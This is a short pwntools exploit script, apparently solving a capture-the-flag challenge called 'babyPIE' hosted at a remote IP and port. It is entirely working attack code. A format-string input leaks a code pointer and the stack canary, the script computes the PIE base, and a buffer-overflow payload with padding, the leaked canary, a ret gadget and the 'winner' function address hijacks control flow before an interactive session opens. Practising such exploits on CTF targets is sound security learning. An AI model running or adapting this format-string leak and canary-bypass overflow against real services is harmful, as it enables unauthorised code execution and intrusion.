from pwn import *

elf = context.binary = ELF("./babyPIE")

offset = 4882

#p=process("./babyPIE")
p=remote("34.213.62.140",6501)

p.recvline()
p.sendline("%27$p,%25$p")
a = p.recvline()
print(a)
print(a[:14])
leak = int(a[0:14],16)
print(hex(leak))
canary = int(a[15:-1],16)

elf.address = leak-offset
print(hex(elf.address))
print(hex(canary))
ret = 0x000000000000101a
payload = b'a'*152   # padding upto canary
payload += p64(canary)
payload += b'a'*8 
#payload += p64(leak-offset+4686)
payload += p64(elf.address+ret)+p64(elf.sym.winner)
p.sendline(payload)

p.interactive()
